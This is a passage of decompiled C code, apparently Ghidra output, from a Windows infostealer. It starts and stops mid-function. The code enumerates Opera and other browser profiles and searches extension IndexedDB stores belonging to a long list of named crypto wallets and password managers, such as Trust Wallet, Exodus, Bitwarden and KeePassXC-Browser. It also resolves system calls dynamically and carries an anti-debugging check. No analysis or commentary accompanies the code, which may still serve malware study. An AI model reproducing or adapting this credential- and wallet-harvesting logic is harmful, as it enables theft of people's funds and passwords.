        (*_DAT_003d93c8)(local_324,local_21c,1);
        iVar2 = (*_DAT_003d93b4)(local_21c,0x80000000,3,0,3,0x80,0);
        if (iVar2 == -1) {
          uVar6 = 0;
          uVar8 = 0;
        }
        else {
          iVar7 = (*_DAT_003d936c)(iVar2,&local_58c);
          if (iVar7 == 0) {
            (*_DAT_003d93b8)(iVar2);
            uVar6 = 0;
            uVar8 = 0;
          }
          else {
            (*_DAT_003d93b8)(iVar2);
            uVar6 = local_58c;
            uVar8 = local_588;
          }
        }
        uVar9 = __alldiv(uVar6,uVar8,1000,0);
        _DAT_003d92f4 = _DAT_003d92f4 + (int)uVar9;
        iVar2 = (*_DAT_003d9550)();
        if (iVar2 == 0) {
          _DAT_003d92e0 = _DAT_003d92e0 + 1;
        }
        iVar2 = (*_DAT_003d9550)();
        if (iVar2 == 0) {
          _DAT_003d92e0 = _DAT_003d92e0 + 1;
        }
        piVar1 = *(int **)(local_570 + 0x20);
        if (piVar1 == (int *)0x0) {
          _DAT_003d9814 = 0x10000;
        }
        else {
          if (*piVar1 == 2) {
            _DAT_003d9814 = FUN_003ad750((char **)piVar1[1],(int)local_21c,local_114,0,2);
          }
          else {
            _DAT_003d9814 = 0x80000;
          }
        }
        (*_DAT_003d9424)(local_21c);
        param_3 = local_578;
        param_2 = local_570;
      }
      iVar2 = (*_DAT_003d9438)(local_574,local_56c);
      uVar10 = (undefined)unaff_EDI;
    } while (iVar2 != 0);
    (*_DAT_003d93a8)(local_574);
    uVar9 = CONCAT44(extraout_EDX,local_574);
  }
  local_574 = (int)uVar9;
  terminate_if_debugger_present
            (local_8 ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar9 >> 0x20),uVar10);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_0039f250(undefined4 param_1,undefined4 param_2,int param_3,int param_4,int param_5,int param_6,
            int param_7,int param_8)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar4;
  undefined8 uVar5;
  undefined uVar6;
  undefined *puVar7;
  char *pcVar8;
  undefined local_98c [44];
  undefined local_960 [276];
  undefined local_84c [264];
  undefined local_744 [264];
  undefined local_63c [264];
  undefined local_534 [264];
  undefined local_42c [264];
  undefined local_324 [264];
  undefined local_21c [264];
  undefined local_114 [268];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  (*_DAT_003d9374)(local_84c,"%s\\*.*");
  if (param_5 == 0) {
    uVar6 = 0x74;
    puVar7 = local_84c;
    uVar5 = (*_DAT_003d95e0)();
    uVar4 = (undefined4)((ulonglong)uVar5 >> 0x20);
    iVar1 = (int)uVar5;
    if (iVar1 != -1) {
      do {
        iVar2 = (*_DAT_003d9550)(local_960,&DAT_003d0ab0);
        if ((iVar2 != 0) && (iVar2 = (*_DAT_003d9550)(local_960,&DAT_003d0ab4), iVar2 != 0)) {
          trim_string((undefined (*) [16])local_114,0,0x104);
          (*_DAT_003d9520)(local_114,local_960);
          (*_DAT_003d9374)(local_42c,"%s\\%s\\%s\\%s");
          (*_DAT_003d9374)(local_744,"%s\\%s",local_42c,DAT_003d8a9c);
          (*_DAT_003d9374)(local_21c,"%s\\%s\\%s\\%s");
          (*_DAT_003d9374)(local_63c,"%s\\%s",local_21c,DAT_003d8a9c);
          (*_DAT_003d9374)(local_324,"%s\\%s\\%s\\chrome-extension_%s_0.indexeddb.leveldb");
          (*_DAT_003d9374)(local_534,"%s\\%s",local_324,DAT_003d8a9c);
          if ((param_6 != 0) &&
             ((uVar3 = (*_DAT_003d9470)(local_744), uVar3 != 0xffffffff && ((uVar3 & 0x10) == 0))))
          {
            FUN_0039ee40(local_114,param_3,local_42c,param_2,param_4,1);
          }
          if (((param_7 != 0) && (uVar3 = (*_DAT_003d9470)(local_63c), uVar3 != 0xffffffff)) &&
             ((uVar3 & 0x10) == 0)) {
            FUN_0039ee40(local_114,param_3,local_21c,param_2,param_4,2);
          }
          if (((param_8 != 0) && (uVar3 = (*_DAT_003d9470)(local_534), uVar3 != 0xffffffff)) &&
             ((uVar3 & 0x10) == 0)) {
            FUN_0039ee40(local_114,param_3,local_324,param_2,param_4,3);
          }
          trim_string((undefined (*) [16])local_42c,0,0x104);
          trim_string((undefined (*) [16])local_744,0,0x104);
          trim_string((undefined (*) [16])local_21c,0,0x104);
          trim_string((undefined (*) [16])local_63c,0,0x104);
          trim_string((undefined (*) [16])local_324,0,0x104);
          trim_string((undefined (*) [16])local_534,0,0x104);
        }
        iVar2 = (*_DAT_003d9438)(iVar1,local_98c);
        uVar6 = SUB41(puVar7,0);
      } while (iVar2 != 0);
      (*_DAT_003d93a8)(iVar1);
      terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar6);
      return;
    }
    goto LAB_0039f7ec;
  }
  trim_string((undefined (*) [16])local_114,0,0x104);
  if (param_5 == 1) {
    pcVar8 = "Opera Stable";
LAB_0039f5c7:
    (*_DAT_003d9520)(local_114,pcVar8);
  }
  else {
    if (param_5 == 2) {
      pcVar8 = "Opera GX Stable";
      goto LAB_0039f5c7;
    }
    if (param_5 == 3) {
      pcVar8 = "Opera Crypto Stable";
      goto LAB_0039f5c7;
    }
  }
  (*_DAT_003d9374)(local_324,"%s\\%s\\%s\\%s");
  (*_DAT_003d9374)(local_534,"%s\\%s",local_324,DAT_003d8a9c);
  (*_DAT_003d9374)(local_21c,"%s\\%s\\%s\\%s");
  uVar4 = DAT_003d8a9c;
  (*_DAT_003d9374)(local_63c,"%s\\%s",local_21c);
  uVar6 = (undefined)uVar4;
  (*_DAT_003d9374)(local_42c,"%s\\%s\\%s\\chrome-extension_%s_0.indexeddb.leveldb");
  (*_DAT_003d9374)(local_744,"%s\\%s",local_42c,DAT_003d8a9c);
  if (((param_6 != 0) && (uVar3 = (*_DAT_003d9470)(local_534), uVar3 != 0xffffffff)) &&
     ((uVar3 & 0x10) == 0)) {
    FUN_0039ee40(local_114,param_3,local_324,param_2,param_4,1);
  }
  if (((param_7 != 0) && (uVar3 = (*_DAT_003d9470)(local_63c), uVar3 != 0xffffffff)) &&
     ((uVar3 & 0x10) == 0)) {
    FUN_0039ee40(local_114,param_3,local_21c,param_2,param_4,2);
  }
  if (((param_8 != 0) && (uVar3 = (*_DAT_003d9470)(local_744), uVar3 != 0xffffffff)) &&
     ((uVar3 & 0x10) == 0)) {
    FUN_0039ee40(local_114,param_3,local_42c,param_2,param_4,3);
  }
  trim_string((undefined (*) [16])local_324,0,0x104);
  trim_string((undefined (*) [16])local_534,0,0x104);
  trim_string((undefined (*) [16])local_21c,0,0x104);
  trim_string((undefined (*) [16])local_63c,0,0x104);
  trim_string((undefined (*) [16])local_42c,0,0x104);
  trim_string((undefined (*) [16])local_744,0,0x104);
  uVar4 = extraout_EDX_00;
LAB_0039f7ec:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar4,uVar6);
  return;
}



void FUN_0039f800(int param_1,int param_2)

{
  undefined4 unaff_EBX;
  
  if (param_2 == 3) {
    FUN_0039f250("Opera Wallet",unaff_EBX,param_1,1,3,0,0,1);
    return;
  }
  FUN_0039f250(DAT_003d8bb0,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d926c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d927c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8c10,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8aa4,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d915c,unaff_EBX,param_1,1,param_2,1,0,1);
  FUN_0039f250(DAT_003d8b48,unaff_EBX,param_1,1,param_2,1,0,1);
  FUN_0039f250(DAT_003d8f10,unaff_EBX,param_1,1,param_2,0,0,1);
  FUN_0039f250(DAT_003d8d98,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8d1c,unaff_EBX,param_1,1,param_2,0,1,0);
  FUN_0039f250(DAT_003d8fc4,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8fa8,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d90fc,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8efc,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8d3c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9244,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8b10,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8c0c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8f7c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8d38,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9218,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8d88,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8ad0,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9044,unaff_EBX,param_1,1,param_2,1,1,1);
  FUN_0039f250(DAT_003d8fe0,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d908c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d926c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8b3c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d901c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8d0c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8b8c,unaff_EBX,param_1,1,param_2,0,0,1);
  FUN_0039f250(DAT_003d8b68,unaff_EBX,param_1,1,param_2,0,0,1);
  FUN_0039f250(DAT_003d8d08,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d90c8,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8bac,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8ab4,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9040,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8dd8,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8cb4,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9148,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d925c,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d9050,unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250(DAT_003d8f78,unaff_EBX,param_1,0,param_2,1,1,0);
  FUN_0039f250(DAT_003d8ae8,unaff_EBX,param_1,0,param_2,1,1,1);
  FUN_0039f250(DAT_003d8b88,unaff_EBX,param_1,0,param_2,1,1,1);
  FUN_0039f250(DAT_003d9210,unaff_EBX,param_1,0,param_2,1,1,1);
  FUN_0039f250("Tronium",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Trust Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Exodus Web3 Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Braavos",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Enkrypt",unaff_EBX,param_1,1,param_2,1,1,1);
  FUN_0039f250("OKX Web3 Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Sender",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Hashpack",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Eternl",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("GeroWallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Pontem Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Petra Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Martian Wallet",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Finnie",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Leap Terra",unaff_EBX,param_1,1,param_2,1,0,0);
  FUN_0039f250("Microsoft AutoFill",unaff_EBX,param_1,0,param_2,1,0,0);
  FUN_0039f250("Bitwarden",unaff_EBX,param_1,0,param_2,1,0,0);
  FUN_0039f250("KeePass Tusk",unaff_EBX,param_1,0,param_2,1,0,0);
  FUN_0039f250("KeePassXC-Browser",unaff_EBX,param_1,0,param_2,1,0,0);
  FUN_0039f250("Bitwarden",unaff_EBX,param_1,0,param_2,1,0,0);
  return;
}



// WARNING: Removing unreachable block (ram,0x003a03b4)
// WARNING: Removing unreachable block (ram,0x003a032f)
// WARNING: Removing unreachable block (ram,0x003a0347)
// WARNING: Removing unreachable block (ram,0x003a03cc)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003a0120(undefined4 param_1,undefined4 param_2,void *param_3,undefined4 param_4)

{
  bool bVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined4 *puVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar6;
  int **in_FS_OFFSET;
  undefined uVar7;
  void *local_644;
  uint local_630;
  void *local_628 [4];
  undefined4 local_618;
  uint local_614;
  undefined local_60c [1000];
  undefined local_224 [264];
  int *local_11c [66];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c51cb;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar2;
  trim_string((undefined (*) [16])local_224,0,0x104);
  trim_string((undefined (*) [16])local_60c,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x1c,0,0,local_60c,uVar2);
  (*_DAT_003d9520)(local_224,(iVar3 < 0) - 1 & (uint)local_60c);
  (*_DAT_003d9520)(local_224,param_4);
  trim_string((undefined (*) [16])local_11c,0,0x104);
  (*_DAT_003d9520)(local_11c,local_224);
  uVar7 = 0xfc;
  (*_DAT_003d9520)(local_11c);
  (*_DAT_003d9520)(local_11c,DAT_003d8d54);
  local_614 = 0xf;
  local_618 = 0;
  local_628[0] = (void *)((uint)local_628[0] & 0xffffff00);
  piVar4 = (int *)_strlen((char *)local_11c);
  FUN_003894c0(local_628,local_11c,piVar4);
  local_8 = 0;
  puVar5 = (undefined4 *)FUN_003a58e0();
  if (7 < (uint)puVar5[5]) {
    puVar5 = (undefined4 *)*puVar5;
  }
  uVar2 = (*_DAT_003d9364)(puVar5);
  if ((uVar2 == 0xffffffff) || ((uVar2 & 0x10) != 0)) {
    bVar1 = false;
  }
  else {
    bVar1 = true;
  }
  if (7 < local_630) {
    FUN_003aee4b(local_644);
  }
  local_8 = 0xffffffff;
  if (0xf < local_614) {
    FUN_003aee4b(local_628[0]);
  }
  local_614 = 0xf;
  local_618 = 0;
  local_628[0] = (void *)((uint)local_628[0] & 0xffffff00);
  if (bVar1) {
    FUN_00399d30(local_11c);
  }
  FUN_0039c200(param_3,&DAT_003ce656,local_224,param_1,0,0,*(int **)((int)param_3 + 0x20),param_2,0)
  ;
  uVar6 = extraout_EDX;
  if (*(char *)((int)param_3 + 6) != '\0') {
    FUN_0039f800((int)param_3,0);
    uVar6 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar6,uVar7);
  return;
}



// WARNING: Removing unreachable block (ram,0x003a0772)
// WARNING: Removing unreachable block (ram,0x003a06e4)
// WARNING: Removing unreachable block (ram,0x003a06fc)
// WARNING: Removing unreachable block (ram,0x003a078a)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_003a0400(undefined4 param_1,undefined4 param_2,void *param_3,undefined4 param_4,int param_5)

{
  bool bVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined4 *puVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar6;
  int **in_FS_OFFSET;
  undefined uVar7;
  uint local_75c;
  void *local_750;
  uint local_73c;
  void *local_734 [4];
  undefined4 local_724;
  uint local_720;
  undefined local_718 [1000];
  undefined local_330 [264];
  undefined local_228 [264];
  int *local_120 [66];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c518b;
  local_10 = *in_FS_OFFSET;
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  uVar6 = DAT_003d9068;
  local_18 = uVar2;
  trim_string((undefined (*) [16])local_228,0,0x104);
  trim_string((undefined (*) [16])local_330,0,0x104);
  trim_string((undefined (*) [16])local_718,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x1a,0,0,local_718,uVar2);
  (*_DAT_003d9520)(local_228,(iVar3 < 0) - 1 & (uint)local_718);
  (*_DAT_003d9520)(local_228,uVar6);
  (*_DAT_003d9520)(local_228,param_4);
  iVar3 = (*_DAT_003d9550)(param_4,DAT_003d90a0);
  local_75c = (uint)(iVar3 == 0);
  iVar3 = (*_DAT_003d9550)(param_4,DAT_003d8b00);
  if (iVar3 == 0) {
    local_75c = 2;
  }
  iVar3 = (*_DAT_003d9550)(param_4,"Opera Crypto Stable");
  if (iVar3 == 0) {
    local_75c = 3;
  }
  trim_string((undefined (*) [16])local_718,0,1000);
  iVar3 = (*_DAT_003d9500)(0,0x1a,0,0,local_718);
  (*_DAT_003d9520)(local_330,(iVar3 < 0) - 1 & (uint)local_718);
  (*_DAT_003d9520)(local_330,uVar6);
  trim_string((undefined (*) [16])local_120,0,0x104);
  (*_DAT_003d9520)(local_120,local_228);
  uVar7 = 0xfc;
  (*_DAT_003d9520)(local_120);
  (*_DAT_003d9520)(local_120,DAT_003d8d54);
  local_720 = 0xf;
  local_724 = 0;
  local_734[0] = (void *)((uint)local_734[0] & 0xffffff00);
  piVar4 = (int *)_strlen((char *)local_120);
  FUN_003894c0(local_734,local_120,piVar4);
  local_8 = 0;
  puVar5 = (undefined4 *)FUN_003a58e0();
  if (7 < (uint)puVar5[5]) {
    puVar5 = (undefined4 *)*puVar5;
  }
  uVar2 = (*_DAT_003d9364)(puVar5);
  if ((uVar2 == 0xffffffff) || ((uVar2 & 0x10) != 0)) {
    bVar1 = false;
  }
  else {
    bVar1 = true;
  }
  if (7 < local_73c) {
    FUN_003aee4b(local_750);
  }
  local_8 = 0xffffffff;
  if (0xf < local_720) {
    FUN_003aee4b(local_734[0]);
  }
  local_720 = 0xf;
  local_724 = 0;
  local_734[0] = (void *)((uint)local_734[0] & 0xffffff00);
  if (bVar1) {
    FUN_00399d30(local_120);
  }
  FUN_0039c200(param_3,&DAT_003ce656,local_228,param_1,0,0,*(int **)((int)param_3 + 0x20),param_2,
               param_5);
  uVar6 = extraout_EDX;
  if (*(char *)((int)param_3 + 6) != '\0') {
    FUN_0039f800((int)param_3,local_75c);
    uVar6 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar6,uVar7);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003a07b0(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  uint uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  undefined in_stack_ffffec70;
  
  iVar1 = DAT_003d9098;
  uVar3 = CONCAT44(param_2,DAT_003d933c);
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if (DAT_003d9098 != 0) {
    (*_DAT_003d93f0)(&DAT_003d15ec,&DAT_003da030,0xffff);
    trim_string((undefined (*) [16])&stack0xffffec70,0,5000);
    (*_DAT_003d9520)(&stack0xffffec70,&DAT_003da030);
    (*_DAT_003d9520)(&stack0xffffec70,&DAT_003d0a84);
    (*_DAT_003d9520)(&stack0xffffec70,iVar1);
    (*_DAT_003d93ac)(&DAT_003d15ec,&stack0xffffec70);
    trim_string((undefined (*) [16])&stack0xffffec70,0,5000);
    uVar3 = (*_DAT_003d9514)(DAT_003d9194);
    DAT_003d933c = (uint)uVar3;
    if (DAT_003d933c != 0) {
      _DAT_003d9330 = (*_DAT_003d9474)(DAT_003d933c,DAT_003d8d18);
      _DAT_003d934c = (*_DAT_003d9474)(DAT_003d933c,DAT_003d90f8);
      _DAT_003d92fc = (*_DAT_003d9474)(DAT_003d933c,DAT_003d8c14);
      _DAT_003d9324 = (*_DAT_003d9474)(DAT_003d933c,DAT_003d8b4c);
      _DAT_003d9340 = (*_DAT_003d9474)(DAT_003d933c,DAT_003d92ac);
      uVar4 = (*_DAT_003d9474)(DAT_003d933c,DAT_003d8dc0);
      uVar3 = uVar4 & 0xffffffff00000000 | (ulonglong)DAT_003d933c;
      _DAT_003d931c = (int)uVar4;
    }
    DAT_003d933c = (uint)uVar3;
    if ((((_DAT_003d9330 != 0) && (_DAT_003d934c != 0)) && (_DAT_003d92fc != 0)) &&
       (((_DAT_003d9340 != 0 && (_DAT_003d931c != 0)) && (_DAT_003d9324 != 0)))) {
      terminate_if_debugger_present
                (uVar2 ^ (uint)&stack0xfffffffc,(int)(uVar3 >> 0x20),in_stack_ffffec70);
      return;
    }
  }
  DAT_003d933c = (uint)uVar3;
  terminate_if_debugger_present
            (uVar2 ^ (uint)&stack0xfffffffc,(int)(uVar3 >> 0x20),in_stack_ffffec70);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a0960(undefined4 param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  undefined4 unaff_EBX;
  void *unaff_EDI;
  ulonglong uVar3;
  undefined uVar4;
  undefined local_608 [1000];
  undefined local_220 [264];
  undefined local_118 [268];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])local_220,0,0x104);
  trim_string((undefined (*) [16])local_118,0,0x104);
  trim_string((undefined (*) [16])local_608,0,1000);
  iVar1 = (*_DAT_003d9500)(0,0x1a,0,0,local_608);
  (*_DAT_003d9520)(local_220,(uint)local_608 & (iVar1 < 0) - 1);
  (*_DAT_003d9520)(local_220);
  (*_DAT_003d9520)(local_118,local_220);
  (*_DAT_003d9520)(local_118,&DAT_003d15f4);
  (*_DAT_003d9520)(local_118,&DAT_003d15f8);
  (*_DAT_003d9520)(local_118,&DAT_003d15fc);
  (*_DAT_003d9520)(local_118,&DAT_003d1600);
  (*_DAT_003d9520)(local_118,&DAT_003d1604);
  (*_DAT_003d9520)(local_118,&DAT_003d1608);
  (*_DAT_003d9520)(local_118,&DAT_003d0e3c);
  (*_DAT_003d9520)(local_118,&DAT_003d0e40);
  (*_DAT_003d9520)(local_118,&DAT_003d0e48);
  (*_DAT_003d9520)(local_118,&DAT_003d160c);
  uVar4 = 0xe8;
  uVar3 = (*_DAT_003d9470)();
  uVar2 = (undefined4)(uVar3 >> 0x20);
  if (((int)uVar3 != -1) && ((uVar3 & 0x10) == 0)) {
    FUN_00393b70();
    iVar1 = FUN_003a07b0(extraout_ECX,extraout_EDX);
    if (iVar1 != 0) {
      FUN_0039c630(unaff_EDI,(int)&DAT_003ce656,local_220,unaff_EBX,*(int **)((int)unaff_EDI + 0x20)
                   ,param_1);
    }
    (*_DAT_003d95dc)(DAT_003d933c);
    uVar2 = extraout_EDX_00;
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar2,uVar4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_003a0b30(undefined4 param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)FUN_003b103e(0x20);
  local_10 = param_1;
  local_c = param_2;
  iVar2 = FUN_00384da0(&local_10,param_2,local_8);
  if (iVar2 == 0) {
    if (local_8 != (undefined4 *)0x0) {
      piVar1 = local_8 + 5;
      _DAT_003d92f8 = FUN_00384f60(local_8[5]);
      _DAT_003d9314 = FUN_00384f60(*piVar1);
      _DAT_003d9348 = FUN_00384f60(*piVar1);
      _DAT_003d9334 = FUN_00384f60(*piVar1);
      _DAT_003d9328 = FUN_00384f60(*piVar1);
      _DAT_003d9344 = FUN_00384f60(*piVar1);
      _DAT_003d9320 = FUN_00384f60(*piVar1);
      _DAT_003d9318 = FUN_00384f60(*piVar1);
      return 1;
    }
  }
  else {
    trim_string((undefined (*) [16])&local_8,0,4);
  }
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_003a0c50(void *this,undefined4 param_1,undefined4 param_2)

{
  undefined4 uVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 extraout_EDX;
  undefined unaff_BL;
  int **in_FS_OFFSET;
  void *apvStack101924 [4];
  undefined4 uStack101908;
  uint uStack101904;
  void *apvStack101896 [4];
  undefined4 uStack101880;
  uint uStack101876;
  void *apvStack101868 [4];
  undefined4 uStack101852;
  uint uStack101848;
  void *apvStack101840 [4];
  undefined4 uStack101824;
  uint uStack101820;
  undefined auStack101812 [100000];
  undefined local_714 [1000];
  undefined local_32c [264];
  undefined local_224 [264];
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c5258;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  trim_string((undefined (*) [16])auStack101812,0,100000);
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0x18) = 0;
  *(undefined4 *)((int)this + 0x14) = 0;
  *(undefined4 *)((int)this + 0x1c) = 0;
  FUN_003a0b30(param_1,param_2);
  FUN_003a0960(auStack101812);
  FUN_003a0960(auStack101812);
  FUN_003a0400(DAT_003d8e0c,auStack101812,this,DAT_003d90a0,0);
  FUN_003a0400(DAT_003d8e34,auStack101812,this,DAT_003d8b00,0);
  FUN_003a0400("Opera Crypto",auStack101812,this,"Opera Crypto Stable",1);
  FUN_003a0120(DAT_003d8eb4,auStack101812,this,DAT_003d8e48);
  FUN_003a0120(DAT_003d8c4c,auStack101812,this,DAT_003d9140);
  FUN_003a0120(DAT_003d8fd0,auStack101812,this,DAT_003d8c2c);
  FUN_003a0120(DAT_003d8eb8,auStack101812,this,DAT_003d8f08);
  FUN_003a0120(DAT_003d8ee0,auStack101812,this,DAT_003d92b4);
  FUN_003a0120(DAT_003d91bc,auStack101812,this,DAT_003d8aac);
  FUN_003a0120(DAT_003d90e4,auStack101812,this,DAT_003d8e80);
  FUN_003a0120(DAT_003d8ab8,auStack101812,this,DAT_003d90ac);
  FUN_003a0120(DAT_003d8e7c,auStack101812,this,DAT_003d8c6c);
  FUN_003a0120(DAT_003d8be8,auStack101812,this,DAT_003d8c8c);
  FUN_003a0120(DAT_003d8e70,auStack101812,this,DAT_003d8f34);
  FUN_003a0120(DAT_003d91f0,auStack101812,this,DAT_003d8ad8);
  FUN_003a0120(DAT_003d8b14,auStack101812,this,DAT_003d8bc4);
  FUN_003a0120(DAT_003d92bc,auStack101812,this,DAT_003d903c);
  FUN_003a0120(DAT_003d8ba4,auStack101812,this,DAT_003d905c);
  FUN_003a0120(DAT_003d918c,auStack101812,this,DAT_003d8a84);
  FUN_003a0120(DAT_003d8b30,auStack101812,this,DAT_003d9108);
  FUN_003a0120(DAT_003d8d14,auStack101812,this,DAT_003d8af4);
                    // WARNING: Load size is inaccurate
  if (*this != '\0') {
    FUN_0039d440((int)this);
                    // WARNING: Load size is inaccurate
    if (*this != '\0') {
      FUN_0039e790(auStack101812);
      FUN_003a0960(auStack101812);
      FUN_0039c8c0(auStack101812);
    }
  }
  if (*(char *)((int)this + 5) != '\0') {
    trim_string((undefined (*) [16])local_11c,0,0x104);
    trim_string((undefined (*) [16])local_32c,0,0x104);
    trim_string((undefined (*) [16])local_224,0,0x104);
    trim_string((undefined (*) [16])local_714,0,1000);
    iVar2 = (*_DAT_003d9500)(0,0x1a,0,0,local_714);
    (*_DAT_003d9520)(local_11c,(uint)local_714 & (iVar2 < 0) - 1);
    (*_DAT_003d9520)(local_11c,&DAT_003ce7fc);
    (*_DAT_003d9520)(local_11c,&DAT_003d1624);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e40);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e3c);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e40);
    (*_DAT_003d9520)(local_11c,&DAT_003d1628);
    (*_DAT_003d9520)(local_11c,&DAT_003d15fc);
    (*_DAT_003d9520)(local_11c,&DAT_003d0e38);
    (*_DAT_003d9520)(local_11c,&DAT_003d162c);
